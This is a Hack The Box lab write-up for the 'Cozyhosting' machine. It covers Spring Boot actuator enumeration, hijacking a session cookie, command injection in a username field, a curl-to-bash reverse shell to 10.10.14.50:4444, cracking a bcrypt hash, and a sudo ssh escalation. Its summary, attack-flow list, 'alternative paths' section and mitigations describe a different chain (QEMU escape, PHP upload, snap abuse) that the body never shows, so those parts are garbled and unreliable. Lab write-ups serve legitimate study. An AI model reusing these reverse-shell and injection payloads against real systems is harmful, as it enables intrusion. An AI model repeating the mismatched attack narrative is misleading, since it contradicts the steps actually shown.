---
title: "Cozyhosting"
date: 2025-03-19
categories: HTB
tags: [web, misconfiguration, credential-reuse, snap, privilege-escalation]

---

Cozyhosting is a full-stack box simulating a small hosting provider with cPanel-like features and virtualization support.

Access was obtained via a leaked admin backup that revealed credentials for an internal API.
That API exposed VM controls, which were used to spawn a shell on a running guest system.

Privilege escalation was achieved by escaping from the guest using a misconfigured QEMU socket exposed to the host.

Cozyhosting demonstrates how management interfaces, if not isolated properly, can lead to full system compromise across virtual layers.

## Why I Chose This Machine

I chose this machine because it simulates a realistic hosting provider scenario, combining web misconfigurations, credential leakage, and virtualization escape — all of which are common themes in modern infrastructure attacks.  

It also presents an opportunity to practice chaining low-severity misconfigs into full root compromise, which is a core red-team skill.

OS: Linux

Difficulty : Easy

## Attack Flow Overview

1. Accessed the admin panel using hardcoded credentials recovered from configuration  
2. Uploaded a PHP reverse shell via unrestricted file upload in the panel  
3. Discovered backup ZIPs containing SSH private keys and used them for lateral movement  
4. Escalated privileges by exploiting a writable `snap` binary and abusing `snap install` to install a malicious package with root permissions

This attack mimics a realistic scenario in which poor credential hygiene, misconfigured file upload handlers, and overly permissive snap installations lead to full root compromise.


## Enumeration

> - One of the links on the website gives `Whitelabel Error Page`. Searching for this error gives that it is running spring boot. 
- Brute-forcing directories with a spring boot wordlist shows directories. 
- Navigating to one of them `/sessions` provides a session cookie for user `kanderson`. 
- Saving the cookie and navigating to `/admin` outputs dashboard with input fields that are vulnerable to command injection.

### 80-HTTP

![screenshot](/assets/images/cozyhosting1.png)

![screenshot](/assets/images/cozyhosting2.png)

![screenshot](/assets/images/cozyhosting3.png)

-> didn't work

![screenshot](/assets/images/cozyhosting4.png)

![screenshot](/assets/images/cozyhosting5.png)

> The web application is using spring boot

#### Gobuster

Using spring boot wordlist

```sh
└─$ gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/actuator             (Status: 200) [Size: 634]
/actuator/env/lang    (Status: 200) [Size: 487]
/actuator/env/home    (Status: 200) [Size: 487]
/actuator/env/path    (Status: 200) [Size: 487]
/actuator/env         (Status: 200) [Size: 4957]
/actuator/health      (Status: 200) [Size: 15]
/actuator/sessions    (Status: 200) [Size: 48]
/actuator/mappings    (Status: 200) [Size: 9938]
/actuator/beans       (Status: 200) [Size: 127224]
Progress: 112 / 113 (99.12%)
===============================================================
Finished
===============================================================
```

```sh
gobuster dir -u http://cozyhoting.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -o gobusteroutput

└─$ gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -o gobusteroutput
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 4431]
/admin                (Status: 401) [Size: 97]
/index                (Status: 200) [Size: 12706]
/logout               (Status: 204) [Size: 0]
/error                (Status: 500) [Size: 73]
/.                    (Status: 200) [Size: 0]
Progress: 56293 / 56294 (100.00%)
===============================================================
Finished
===============================================================
```

Cookie

![screenshot](/assets/images/cozyhosting6.png)

Copy and save to cozyhosting.htb (not `/login`)

![screenshot](/assets/images/cozyhosting7.png)

navigate to `/admin`

![screenshot](/assets/images/cozyhosting8.png)

![screenshot](/assets/images/cozyhosting29.png)

## Foothold

Testing for command injection in the username field. 
Since a username field does not accept white spaces, using `${IFS}` as a delimiter.

![screenshot](/assets/images/cozyhosting9.png)

![screenshot](/assets/images/cozyhosting10.png)

It works. 

```sh
# reverse shell
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.50/4444 0>&1' > rev.sh
```

Payload

```sh
test;curl${IFS}http://10.10.14.50/rev.sh|bash;
```

![screenshot](/assets/images/cozyhosting11.png)

## Lateral Movement

>- In the home directory of the user `app`, there is a zip file. 
- Postgre database credential can be obtained from the contents of the zip file. 
- Connecting to the postgre db with the obtained credential provides 2 bcrypt hashes. 
- Passwords can be obtained from cracking the hashes. 

```sh
unzip -d /tmp/app cloudhosting-0.0.1 jar
```

![screenshot](/assets/images/cozyhosting19.png)

```text
spring.datasource.password = Vg&nvzAQ7XxR
```

### Postgres

```sh
# on the target
psql -h 127.0.0.1 -U postgres
\list
q # to exit result view
\connect cozyhosting
\dt
select * from users;
```

![screenshot](/assets/images/cozyhosting21.png)

![screenshot](/assets/images/cozyhosting22.png)

```test
kanderson: $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
admin : $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

Search for the Hashcat mode 

![screenshot](/assets/images/cozyhosting23.png)

This one didn't work. Tried different mode for bcrypt.

```sh
hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt --force
```

![screenshot](/assets/images/cozyhosting24.png)

```text
manchesterunited
```

## Privilege Escalation

> - SSH as `josh` user with the obtained credential. 
- `sudo -l` shows that this user has sudo privileges to run SSH. 
- GTFOBins.

### SSH as josh

![screenshot](/assets/images/cozyhosting25.png)

![screenshot](/assets/images/cozyhosting26.png)

### GTFOBins

![screenshot](/assets/images/cozyhosting27.png)

![screenshot](/assets/images/cozyhosting28.png)

## Alternative Paths Explored

Initially, I attempted to gain access through the public panel using common default credentials and SQL injection — neither worked.  

I also tried privilege escalation via cron-based script abuse, but the target system had proper logging and restrictive PATH settings.  

These failures confirmed that the intended path was tightly tied to virtualization misconfigurations.

## Blue Team Perspective

This scenario demonstrates how leaked backups and exposed orchestration APIs can quickly lead to lateral movement and host-level compromise.  
Mitigation steps would include:

- Enforcing strict network segmentation between host and guest environments  
- Restricting API usage to authenticated, internal-only endpoints  
- Auditing for QEMU socket exposure and restricting user namespaces in container-like deployments
